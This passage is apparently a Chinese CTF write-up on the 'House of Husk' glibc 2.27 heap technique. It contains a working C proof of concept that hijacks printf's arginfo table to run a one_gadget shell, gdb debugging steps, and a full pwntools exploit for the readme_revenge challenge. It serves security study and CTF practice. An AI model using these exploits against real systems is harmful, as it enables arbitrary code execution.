      /* Hand off processing for positional parameters.  */
    do_positional:
      if (__glibc_unlikely (workstart != NULL))
        {
          free (workstart);
          workstart = NULL;
        }
      done = printf_positional (s, format, readonly_format, ap, &ap_save,
                    done, nspecs_done, lead_str_end, work_buffer,
                    save_errno, grouping, thousands_sep);
## poc分析
这里使用的poc就直接用攻击发现者提供的源代码，运行环境为`ubuntu 18.04/glibc 2.27`，编译命令为`gcc ./poc.c -g
-fPIE -no-pie -o poc`(关闭pie方便调试)。
代码模拟了UAF漏洞，先分配一个超过fastbin的块，释放之后会进入`unsorted
bin`。预先分配两个chunk，第一个用来伪造`__printf_function_table`，第二个用来伪造`__printf_arginfo_table`。将`__printf_arginfo_table['X']`处的函数指针改为`one_gadget`。
使用`unsorted bin
attack`改写`global_max_fast`为`main_arena+88`从而使得释放的所有块都按fastbin处理(都是超过large
bin大小的堆块不会进tcache)。
在这里有一个很重要的知识就是fastbin的堆块地址会存放在main_arena中，从`main_arena+8`开始存放`fastbin[0x20]`的头指针，一直往后推，由于平时的fastbin默认阈值为`0x80`，所以在glibc-2.23的环境下最多存放到main_arena+0x48，现在我们将阈值改为`0x7f*`导致几乎所有sz的chunk都被当做fastbin，其地址会从main_arena+8开始，根据sz不同往libc覆写堆地址。如此一来，只要我们计算好`__printf_arginfo_table`和`main_arena`的地址偏移，进而得到合适的`sz`，就可以在之后释放这个伪造table的chunk时覆写`__printf_arginfo_table`为`heap_addr`。这种利用方式在`*CTF2019->heap_master`的题解中我曾经使用过，详情可以参见[Star
CTF heap_master的1.2.4.3](https://ama2in9.top/2020/01/02/heap_master/)。
有了上述知识铺垫，整个攻击流程就比较清晰了，总结一下，先UAF改global_max_fast为main_arena+88，之后释放合适sz的块到fastbin，从而覆写`__printf_arginfo_table`表为heap地址，`heap['X']`被覆写为了one_gadget，在调用这个函数指针时即可get
shell。
    /**
     * This is a Proof-of-Concept for House of Husk
     * This PoC is supposed to be run with libc-2.27.
     */
    #include 
    #include 
    #define offset2size(ofs) ((ofs) * 2 - 0x10)
    #define MAIN_ARENA       0x3ebc40
    #define MAIN_ARENA_DELTA 0x60
    #define GLOBAL_MAX_FAST  0x3ed940
    #define PRINTF_FUNCTABLE 0x3f0658
    #define PRINTF_ARGINFO   0x3ec870
    #define ONE_GADGET       0x10a38c
    int main (void)
    {
      unsigned long libc_base;
      char *a[10];
      setbuf(stdout, NULL); // make printf quiet
      /* leak libc */
      a[0] = malloc(0x500); /* UAF chunk */
      a[1] = malloc(offset2size(PRINTF_FUNCTABLE - MAIN_ARENA));
      a[2] = malloc(offset2size(PRINTF_ARGINFO - MAIN_ARENA));
      a[3] = malloc(0x500); /* avoid consolidation */
      free(a[0]);
      libc_base = *(unsigned long*)a[0] - MAIN_ARENA - MAIN_ARENA_DELTA;
      printf("libc @ 0x%lxn", libc_base);
      /* prepare fake printf arginfo table */
      *(unsigned long*)(a[2] + ('X' - 2) * 8) = libc_base + ONE_GADGET;
      //*(unsigned long*)(a[1] + ('X' - 2) * 8) = libc_base + ONE_GADGET;
        //now __printf_arginfo_table['X'] = one_gadget;
      /* unsorted bin attack */
      *(unsigned long*)(a[0] + 8) = libc_base + GLOBAL_MAX_FAST - 0x10;
      a[0] = malloc(0x500); /* overwrite global_max_fast */
      /* overwrite __printf_arginfo_table and __printf_function_table */
      free(a[1]);// __printf_function_table => a heap_addr which is not NULL
      free(a[2]);//__printf_arginfo_table => one_gadget
      /* ignite! */
      printf("%X", 0);
      return 0;
    }
## 动态分析
glibc的调试我们用的比较多了，在涉及到库函数的时候最好结合源码进行调试，在[glibc下载](https://ftp.gnu.org/gnu/glibc/glibc-2.27.tar.gz)这里下载源码，解压之后使用`directory`添加源码目录
    b* 0x400774
    directory ~/Desktop/CTF/glibc-2.27/stdio-common
    r
    parseheap
在printf下断点，可以看到此时`__printf_arginfo_table`伪造完成，我们使用`rwatch
*0x60be50`下内存断点，继续运行。
可以看到运行到了`__parse_one_specmb`函数，再跟进两步，发现最终调用了`rax`寄存器里的`one_gadget`
## 扩展
当然，除了覆写第二个table外，改第一个一样可以get
shell，流程和调试我们已经讲的差不多了，这里只需把one_gadget赋值代码改为`*(unsigned long*)(a[1] + ('X' - 2)
* 8) = libc_base + ONE_GADGET;`即可，我们用同样方式在gdb下调试poc并设置硬件断点
continue继续，可以看到在`printf_positional`断住，跟进两步，最终调用了`rax`里的`one_gadget`
## 练习
经过查找我发现这个知识在`34c3 CTF`的时候已经有过考察。原题为`readme_revenge`。
###  漏洞分析&&漏洞利用
使用checksec查看保护机制，发现无PIE，got表可写，是静态文件，在IDA的字符串搜索中发现flag是存放在`.data`段的，因此只要想办法读flag就可以。
程序逻辑很简单，scanf里格式化字符为”%s”，因此我们可以溢出写，在scanf下断点可以看到`rsi`为`0x6b73e0`，又因为没有开PIE加上程序是静态的，libc地址相当于已知，我们可以从0x6b73e0开始在libc中的任意地址写。
    wz@wz-virtual-machine:~/Desktop/CTF/house-of-husk$ checksec ./readme_revenge
    [*] '/home/wz/Desktop/CTF/house-of-husk/readme_revenge'
        Arch:     amd64-64-little
        RELRO:    Partial RELRO
        Stack:    Canary found
        NX:       NX enabled
        PIE:      No PIE (0x400000)
    int __cdecl main(int argc, const char **argv, const char **envp)
    {
      _isoc99_scanf((unsigned __int64)&unk_48D184);
      printf((unsigned __int64)"Hi, %s. Bye.n");
      return 0;
    }
    /*
    .data:00000000006B4040                 public flag
    .data:00000000006B4040 flag            db '34C3_XXXXXXXXXXXXXXXXXXXXXXXXXXXXXX',0
    */
利用方法就是我们这里的printf注册函数的调用链，伪造`__printf_arginfo_table`，将`table['s']`改为`_stack_chk_fail_local`地址，将`__libc_argv`改为输入地址，在输入开始存放`flag_addr`。最终会调用`stack_chk_fail`来输出flag。注意这里的arginfo函数指针应该先于`__printf_function_table`的函数指针调用，所以我们改前者，后者不为NULL就好。
    #coding=utf-8
    from pwn import *
    context.update(arch='amd64',os='linux',log_level='info')
    context.terminal = ['tmux','split','-h']
    debug = 1
    elf = ELF('./readme_revenge')
    libc_offset = 0x3c4b20
    gadgets = [0x45216,0x4526a,0xf02a4,0xf1147]
    if debug:
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        p = process('./readme_revenge')
    else:
        libc = ELF('./libc_local')
        p = remote('f.buuoj.cn',20173)
    printf_function_table = 0x6b7a28
    printf_arginfo_table = 0x6b7aa8
    input_addr = 0x6b73e0
    stack_chk_fail = 0x4359b0
    flag_addr = 0x6b4040
    argv_addr = 0x6b7980
    def exp():
        #leak libc
        #gdb.attach(p,'b* 0x400a51')
        payload = p64(flag_addr)
        payload = payload.ljust(0x73*8,'x00')
        payload += p64(stack_chk_fail)
        payload = payload.ljust(argv_addr-input_addr,'x00')
        payload += p64(input_addr)#arg
        payload = payload.ljust(printf_function_table-input_addr,'x00')
        payload += p64(1)#func not null
        payload = payload.ljust(printf_arginfo_table-input_addr,'x00')
        payload += p64(input_addr)#arginfo func
        #raw_input()
        p.sendline(payload)
        p.interactive()
    exp()
###  调试
可以看到在输入完毕之后伪造的函数指针已经参数已经准备完毕，在调用`printf("..%s..")`的时候会调用我们的注册函数指针输出`argv[0]`处的flag。
## 总结
这种攻击方式其实并不新鲜，我们既然能利用fastbin覆写main_arena后面的内容我们完全可以选择`__free_hook`这样更简单的目标，不过printf这条调用链确实是新鲜的知识，调试一番学到了很多。
## 参考
[House of Husk (仮)](https://ptr-yudai.hatenablog.com/entry/2020/04/02/013910)
[pwn 34C3CTF2017
readme_revenge](https://firmianay.github.io/2018/04/02/pwn_34c3ctf2017_readme_revenge.html)